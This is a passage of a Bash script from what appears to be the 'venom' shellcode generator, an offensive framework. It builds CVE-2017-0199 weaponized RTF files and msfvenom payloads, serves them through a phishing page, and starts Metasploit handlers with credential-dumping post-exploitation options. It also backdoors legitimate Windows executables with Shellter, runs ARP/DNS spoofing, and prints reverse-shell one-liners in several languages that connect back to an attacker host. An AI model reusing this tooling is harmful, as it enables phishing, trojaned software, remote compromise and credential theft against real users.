

!
sleep 1
  #
  # check if all dependencies needed are installed
  # check if template exists
  #
  if [ -d $IPATH/templates/CVE-2017-0199 ]; then
     echo "[☠] CVE-2017-0199_toolkit -> found!"
     sleep 2
  else
     echo "[☠] CVE-2017-0199_toolkit -> not found!"
     exit
  fi



#
# build cve-2017-0199 RTF agent ..
# python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 1
#
echo "[☠] Generating MS_word agent .."
sleep 2
cd $IPATH/templates/CVE-2017-0199
xterm -T " SHELLCODE GENERATOR " -geometry 110x10 -e "python cve-2017-0199_toolkit.py -M gen -w $N4m.rtf -u http://$lhost:8080/logo.doc -x 1 && sleep 2" > /dev/null 2>&1
mv $IPATH/templates/CVE-2017-0199/$N4m.rtf $IPATH/output/$N4m.rtf
echo "[☠] Agent: $IPATH/output/$N4m.rtf .."
sleep 2


#
# build msf payload ..
#
echo "[☠] build C,SSL/TLS payload .."
sleep 2
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport PayloadUUIDTracking=true HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --smallest -f exe -o /tmp/shell.exe" > /dev/null 2>&1


  #
  # deliver agent.rtf using apache2
  #
  cd $IPATH/templates/phishing
  cp $InJEc12 mega[bak].html
  sed "s|NaM3|$N4m.rtf|g" mega.html > copy.html
  cp copy.html $ApAcHe/index.html > /dev/null 2>&1
  cd $IPATH/output
  cp $N4m.rtf $ApAcHe/$N4m.rtf > /dev/null 2>&1
    echo "[☠] loading -> Apache2Server!"
    echo "---"
    echo "- SEND THE URL GENERATED TO TARGET HOST"
    echo "- ATTACK VECTOR: http://$lhost"
    echo "---"

    cd $IPATH/templates/CVE-2017-0199
    # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
    echo "[☠] start CVE-2017-0199_toolkit + payload handler"
    echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
    echo "[☯] Please dont test samples on virus total..."
   echo ""
   xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T "CVE-2017-0199_toolkit" -geometry 124x10 -e "python cve-2017-0199_toolkit.py -M exp -p 8080 -e http://$lhost:8080/shell.exe -l /tmp/shell.exe"


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
rm /tmp/shell.exe > /dev/null 2>&1
rm $ApAcHe/shell.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# -----------------------------
# INTERACTIVE SHELLS (built-in) 
# ----------------------------- 
sh_buildin () {
# module description
cat << !

    ╔─────────────────────────────────────────────────────────────╗
    | This module uses system built-in tools sutch as bash, netcat|
    |ssh, python, perl, etc, and use them to spaw a tcp connection|
    ╚─────────────────────────────────────────────────────────────╝

!
sleep 2
QuE=$(zenity --question --title "☠ BUILT-IN SHELL GENERATOR ☠" --text "run module?" --width 220) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

       sh_stage2

      else
        echo "[x] Abort execution .."
        sleep 2
        clear
      fi
}



sh_stage2 () {
# get user input to build the payload
echo "[☆] Enter shell settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1


# CHOSE WHAT PAYLOAD TO USE
InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis module uses system built-in tools sutch\nas bash,netcat,ssh and use them to spaw a\ntcp connection (reverse or bind shell).\n\nAvailable shells:" --radiolist --column "Pick" --column "Option" TRUE "simple ssh shell" FALSE "simple bash shell" FALSE "simple reverse bash shell" FALSE "simple reverse netcat shell" FALSE "simple reverse python shell" FALSE "simple reverse python shell2" FALSE "simple powershell shell" FALSE "simple php reverse shell" FALSE "ruby Reverse_bash_shell" FALSE "ruby Reverse_bash_shell2" FALSE "perl-reverse-shell" --width 350 --height 550) > /dev/null 2>&1


   # built-in systems shells
   if [ "$InSh3ll" = "simple bash shell" ]; then
     echo "[✔] Building -> simple bash shell..."
     echo "---"
     echo "- simple bash shell that uses bash dev/tcp"
     echo "- socket programming to build a conection over tcp"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : bash -i >& /dev/tcp/$lhost/$lport 0>&1"
     echo "- EXECUTE : sudo bash -i >& /dev/tcp/$lhost/$lport 0>&1"
     echo "- NETCAT  : sudo nc -l -v -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "simple reverse bash shell" ]; then
     echo "[✔] Building -> simple reverse bash shell..."
     echo "---"
     echo "- simple reverse bash shell uses bash dev/tcp"
     echo "- socket programming to build a reverse shell over tcp"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : 0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
     echo "- EXECUTE : sudo 0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2
 


   elif [ "$InSh3ll" = "simple reverse netcat shell" ]; then
     echo "[✔] Building -> simple reverse netcat shell..."
     echo "---"
     echo "- simple Netcat reverse shell using bash"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : /bin/sh | nc $lhost $lport"
     echo "- EXECUTE : sudo /bin/sh | nc $lhost $lport"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "simple ssh shell" ]; then
     echo "[✔] Building -> simple ssh shell..."
     echo "---"
     echo "- Reverse connect using an SSH tunnel"
     echo "- Use The ssh client to forward a local port"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : ssh -R 6000:127.0.0.1:$lport $lhost"
     echo "- EXECUTE : sudo ssh -R 6000:127.0.0.1:$lport $lhost"
     echo "- NETCAT  : sudo nc -l -v 127.0.0.1 -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v 127.0.0.1 -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "simple reverse python shell" ]; then
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_shell.py > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.py > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.py > /dev/null 2>&1

     echo "[✔] Building -> simple reverse python shell..."
     echo "---"
     echo "- Reverse connect using one-liner python shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK"
     echo "-           _STREAM);s.connect(('$lhost',$lport));os.dup2(s.fileno(),0); os.dup2"
     echo "-           (s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
     echo "- EXECUTE : python $N4m.py"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "simple reverse python shell2" ]; then
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_shell2.py > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.py > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.py > /dev/null 2>&1
     chown $user $IPATH/output/$N4m.py > /dev/null 2>&1

     echo "[✔] Building -> simple reverse python shell..."
     echo "---"
     echo "- Reverse connect using one-liner python shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "- http://securityweekly.com/2011/10/23/python-one-line-shell-code/"
     echo "-"
     echo "- SHELL   : import socket, subprocess;s = socket.socket();s.connect"
     echo "-           (('$lhost',$lport)) while 1: proc = subprocess.Popen(s.recv(1024),"
     echo "-           shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,"
     echo "-           stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())"
     echo "- EXECUTE : python $N4m.py"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "simple powershell shell" ]; then
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_powershell.ps1 > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.ps1 > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.ps1 > /dev/null 2>&1

     echo "[✔] Building -> simple powershell shell..."
     echo "---"
     echo "- Reverse connection using one-liner powershell (ancii enc)"
     echo "- that uses powershell socket to forward a tcp connection"
     echo "- http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html"
     echo "-"
     echo "- SHELL   : sm=(New-Object Net.Sockets.TCPClient("$lhost",$lport)).GetStream();"
     echo "-           [byte[]]bt=0..65535|%{0};while((i=sm.Read(bt,0,bt.Length)) -ne 0){;"
     echo "-           d=(New-Object Text.ASCIIEncoding).GetString(bt,0,i);st=([text.encoding]"
     echo "-           ::ASCII).GetBytes((iex d 2>&1));sm.Write(st,0,st.Length)}"
     echo "- EXECUTE : press twice in $N4m to execute!"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.ps1" --info > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "ruby Reverse_bash_shell" ]; then
     echo "[✔] Building -> reverse bin/sh shell..."
     echo "---"
     echo "- simple ruby bash shell that uses rsocket"
     echo "- socket programming to build a conection over tcp"
     echo "- http://pwnwiki.io/#!scripting/ruby.md"
     echo "-"
     echo "- SHELL   : ruby -rsocket -e'f=TCPSocket.open('$lhost',$lport).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "ruby Reverse_bash_shell2" ]; then
     echo "[✔] Building -> reverse bin/sh shell..."
     echo "---"
     echo "- simple ruby bash shell that uses rsocket"
     echo "- socket programming to build a conection over tcp"
     echo "- http://pwnwiki.io/#!scripting/ruby.md"
     echo "-"
     echo "- SHELL   : ruby -rsocket -e 'c=TCPSocket.new(\"$lhost\",\"$lport\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "simple php reverse shell" ]; then
     echo "[✔] Building -> simple php reverse shell..."
     echo "---"
     echo "- simple php reverse shell that uses socket programming"
     echo "- and bash (to execute) to forward a tcp connection"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : php -r 'sock=fsockopen('$lhost',$lport);exec('/bin/sh -i <&3 >&3 2>&3');'"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "perl-reverse-shell" ]; then
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" perl-reverse-shell.pl > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.pl > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.pl > /dev/null 2>&1

     echo "[✔] Building -> perl reverse shell..."
     echo "---"
     echo "- Reverse connect using one-liner perl shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "- http://pentestmonkey.net/tools/web-shells/perl-reverse-shell"
     echo "-"
     echo "- SHELL : perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,"
     echo "-         getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open"
     echo "-         (STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     echo "- NETCAT: sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     gedit $IPATH/output/$N4m.pl & xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.pl" --info > /dev/null 2>&1
     sleep 2


   else


     echo "[x] Abort execution .."
     sleep 2
     clear
   fi
cd $IPATH/
}

# ------------------------------------
# exit venom framework
# ------------------------------------
sh_exit () {
echo "[☠] Exit Console -> Stoping Services..."
sleep 1
if [ "$DiStR0" = "Kali" ]; then
service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
service apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi


rm $IPATH/templates/hta_attack/index[bak].html > /dev/null 2>&1
cd $IPATH
cd ..
sudo chown -hR $user venom-main > /dev/null 2>&1
exit
}











#
# Shellter dynamic PE injector by: kyREcon
#
# HINT: accepts only legit executables and backdoor them with shellcode ..
# https://nodistribute.com/result/3UgXTM2Jp9 (0/39)
# https://www.virustotal.com/en/file/efe674192c87df5abce19b4ef7fa0005b7597a3de70d4ca1b34658f949d3df3e/analysis/1498501144/ (1/61)
#
sh_shellcode25 () {

# module description
cat << !

    ╔─────────────────────────────────────────────────────────────╗
    | This module uses Shellter in order to inject shellcode into |
    |  native Windows applications building trojan horses agents  |
    |                                                             |
    |  Detection ratio:                                           |
    |  https://nodistribute.com/result/3UgXTM2Jp9                 |
    ╚─────────────────────────────────────────────────────────────╝

!
sleep 2
# run module or abort ? 
QuE=$(zenity --question --title="☠ Shellter - dynamic PE injector ☠" --text "Author: kyREcon\nRun shellter module?" --width 240) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

#
# checking for wine install ..
#
vinho=`which wine`
if [ "$?" -eq "0" ]; then
  echo "[✔] wine installation found .."
  sleep 2
else
  echo "[x] wine installation NOT FOUND .."
  sleep 2
  sudo apt-get install wine
fi

#
# checking if shellter its installed ..
#
if [ -e "$IPATH/obfuscate/shellter/shellter.exe" ]; then
  echo "[✔] shellter installation found .."
  sleep 2
else
  echo "[x] shellter installation NOT FOUND .."
  sleep 2
fi

  #
  # config settings needed by shellter ..
  #
    echo "[☠] Enter shellcode settings!"
    cd $IPATH/obfuscate/shellter
    LhOst=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
    LpOrt=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
    appl=$(zenity --title "☠ Shellter - Chose file to be backdoored ☠" --filename=$IPATH/ --file-selection) > /dev/null 2>&1
    paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "meterpreter_reverse_tcp" FALSE "meterpreter_reverse_http" FALSE "meterpreter_reverse_https" --width 350 --height 230) > /dev/null 2>&1


   #
   # grab only the executable name from the full path
   # ^/ (search for expression) +$ (print only last espression)
   #
   echo "$appl" > test.txt
   N4m=`grep -oE '[^/]+$' test.txt` > /dev/null 2>&1
   rm test.txt > /dev/null 2>&1


    #
    # copy files generated to output folder ..
    #
    cp $appl $IPATH/obfuscate/shellter
    chown $user $N4m > /dev/null 2>&1
    echo "[✔] Files Successfully copy to shellter .."
    sleep 2


# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $LpOrt
| LHOST   : $LhOst
| PAYLOAD : $paylo
|_AGENT   : $IPATH/output/$N4m


!

  #
  # in ubuntu distros we can not run shellter.exe in wine with root privs
  # so we need to run it in the context of a normal user...
  #
  su $user -c "$arch shellter.exe -a -f $N4m --stealth -p $paylo --lhost $LhOst --port $LpOrt"
  echo ""
    #
    # clean recent files ..
    #
    rm *.bak > /dev/null 2>&1
    mv $N4m $IPATH/output > /dev/null 2>&1
    #
    # config correct payload arch  ..
    #
      if [ "$paylo" = "meterpreter_reverse_tcp" ]; then
        msf_paylo="windows/meterpreter/reverse_tcp"
      elif [ "$paylo" = "meterpreter_reverse_http" ]; then
        msf_paylo="windows/meterpreter/reverse_http"
      elif [ "$paylo" = "meterpreter_reverse_https" ]; then
        msf_paylo="windows/meterpreter/reverse_https"
      else
        echo "[x] abort execution .."
        sleep 2
        sh_menu
      fi

#
# CHOSE HOW TO DELIVER YOUR PAYLOAD
#
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1

  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m $ApAcHe/$N4m
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$LhOst"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
    fi


else


  echo "[x] Abort execution .."
  sleep 2
fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files .."
sleep 2
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
cd output
rm *.ini
clear
cd $IPATH/
}








sh_menu () {
echo "main menu" > /dev/null 2>&1
}


# -----------------------------
# MAIN MENU SHELLCODE GENERATOR
# -----------------------------
# Loop forever
while :
do
clear
cat << !


          __    _ ______  ____   _  _____  ____    __  
         \  \  //|   ___||    \ | |/     \|    \  /  |
          \  \// |   ___||     \| ||     ||     \/   |
           \__/  |______||__/\____|\_____/|__/\__/|__|$ver
    ╔─────────────────╦───────────╦────────────╦──────────────────╗
    |  OPTIONS BUILD  | TARGET OS |   FORMAT   |      OUTPUT      |
    ╠─────────────────╩───────────╩────────────╩──────────────────╣
    |  1 - shellcode     unix(s)      C              C            |
    |  2 - shellcode     windows      C              DLL          |
    |  3 - shellcode     windows      DLL            DLL          |
    |  4 - shellcode     windows      C              PYTHON,EXE   |
    |  5 - shellcode     windows      C              EXE          |
    |  6 - shellcode     windows      PSH-CMD        EXE          |
    |  7 - shellcode     windows      C              RUBY         |
    |  8 - shellcode     windows      MSI-NOUAC      MSI          |
    |  9 - shellcode     windows      POWERSHELL     BAT          |
    | 10 - shellcode     windows      HTA-PSH        HTA          |
    | 11 - shellcode     windows      PSH-CMD        PS1          |
    | 12 - shellcode     windows      PSH-CMD        BAT          |
    | 13 - shellcode     windows      VBS            VBS          |
    | 14 - shellcode     windows      PSH-CMD        VBS          |
    | 15 - shellcode     windows      PSH-CMD,C      PDF          |
    | 16 - shellcode     webserver    PHP            PHP,PHP(b64) |
    | 17 - shellcode     multi OS     PYTHON         PYTHON       |
    | 18 - shellcode     multi OS     JAVA,PSH       JAR(RCE)     |
    | 19 - web_delivery  multi OS     PYTHON,PSH     PYTHON,BAT   |
    | 20 - web_delivery  unix(s)      SH,PYTHON      DEB          |
    | 21 - shellcode     android      DALVIK         APK          |
    | 22 - shellcode     windows      EXE-SERVICE    EXE          |
    | 23 - shellcode     windows      C,SSL-PYTHON   EXE          |
    | 24 - shellcode     windows      C,AVET         EXE          |
    | 25 - shellcode     windows      TROJAN         EXE          |
    | 26 - shellcode     multi OS     PYTHON         PYTHON       |
    ╠─────────────────────────────────────────────────────────────╣
    |  O - microsoft word payloads                                |
    |  S - system built-in shells                                 |
    |  E - exit Shellcode Generator                               |
    ╚─────────────────────────────────────────────────────────────╣
                                                 SSA-RedTeam@2017_|

!
echo "[☠] Shellcode Generator"
sleep 1
echo -n "[➽] Chose Your Venom:"
read choice
case $choice in
1) sh_shellcode1 ;;
2) sh_shellcode2 ;;
3) sh_shellcode3 ;;
4) sh_shellcode4 ;;
5) sh_shellcode5 ;;
6) sh_shellcode6 ;;
7) sh_shellcode7 ;;
8) sh_shellcode8 ;;
9) sh_shellcode9 ;;
10) sh_shellcode10 ;;
11) sh_shellcode11 ;;
